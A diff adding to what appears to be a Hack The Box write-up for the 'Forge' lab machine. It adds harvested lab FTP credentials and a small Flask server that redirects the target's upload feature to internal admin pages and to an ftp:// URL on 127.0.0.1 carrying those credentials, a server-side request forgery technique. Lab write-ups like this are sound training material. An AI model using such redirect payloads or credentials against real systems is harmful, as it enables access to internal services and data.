@@ -269,4 +269,36 @@ if __name__ == "__main__":
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ec5250d8-22af-4536-99c5-36f1b04443b3)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a19acd6a-c8c8-4316-a3f9-5cf8a9e65630)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4c5e43fd-dba0-4ce5-a897-df0c3e1cf0c4)
+```shell
+FTP Creds: user@heightofsecurity123!
+```
+
+FTP:
+```python
+#!/usr/bin/env python
+
+from flask import Flask, redirect, request
+
+app = Flask(__name__)
+
+@app.route("/")
+def admin():
+    return redirect('http://admin.forge.htb/')
+
+@app.route("/announcements")
+def announcements():
+    return redirect('http://admin.forge.htb/announcements')
+
+@app.route("/ftp")
+def ftp():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1')
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=80) 
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8a719445-faa3-4e84-8b70-4ae208357c80)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/147b4404-cff6-4a17-b47f-e0ea763133fb)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/67a85a27-b900-4010-b61f-44229a1787ac)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/412d7505-26c2-4dd6-b543-5a32130d13ed)
+
 
